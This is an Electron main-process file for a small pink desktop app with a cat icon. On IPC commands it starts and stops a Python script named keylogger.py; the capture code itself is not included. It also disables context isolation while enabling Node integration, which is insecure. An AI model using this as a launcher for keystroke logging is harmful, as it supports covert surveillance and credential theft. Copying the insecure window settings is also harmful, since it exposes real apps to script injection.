const { app, BrowserWindow, ipcMain } = require('electron');
const path = require('path');
const { spawn } = require('child_process');

let mainWindow;
let pythonProcess;

function createWindow() {
    mainWindow = new BrowserWindow({
        width: 800,
        height: 600,
        backgroundColor: '#FFC0CB',
        titleBarStyle: 'hidden',
        icon: path.join(__dirname, 'assets', 'cat.jpg'),
        webPreferences: {
            nodeIntegration: true,
            contextIsolation: false,
        }
    });

    mainWindow.setMenu(null);
    mainWindow.loadFile('index.html');
}

app.whenReady().then(createWindow);

// Define the path to the Python script (keylogger.py)
const pythonScriptPath = path.join(app.getAppPath(), 'keylogger.py');

// Start the Python keylogger
ipcMain.on('start-keylogger', () => {
    if (!pythonProcess) {
        pythonProcess = spawn('python', [pythonScriptPath]);
        pythonProcess.stdout.on('data', (data) => {
            console.log(`Python output: ${data}`);
        });
    }
});

// Stop the Python keylogger
ipcMain.on('stop-keylogger', () => {
    if (pythonProcess) {
        pythonProcess.kill();
        pythonProcess = null;
    }
});

app.on('window-all-closed', () => {
    if (process.platform !== 'darwin') app.quit();
});

app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) createWindow();
});
